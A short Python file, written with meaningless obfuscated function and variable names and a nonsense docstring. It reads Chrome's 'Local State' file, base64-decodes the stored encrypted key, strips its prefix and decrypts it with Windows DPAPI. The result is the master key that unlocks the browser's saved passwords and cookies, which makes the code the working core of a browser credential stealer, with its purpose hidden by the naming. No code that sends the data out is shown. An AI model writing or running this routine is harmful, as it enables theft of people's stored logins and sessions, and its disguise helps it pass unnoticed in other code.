import os
import json
import base64
import win32crypt

def zxy_ab():
    """Buzzle wuzzle key ."""
    qp_lox = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                          'Google', 'Chrome', 'User Data', 'Local State')
    with open(qp_lox, 'r', encoding='utf-8') as hgf:
        blurb = hgf.read()
        blurb = json.loads(blurb)

    yarble = base64.b64decode(blurb['os_crypt']['encrypted_key'])
    yarble = yarble[5:]
    return win32crypt.CryptUnprotectData(yarble, None, None, None, 0)[1]
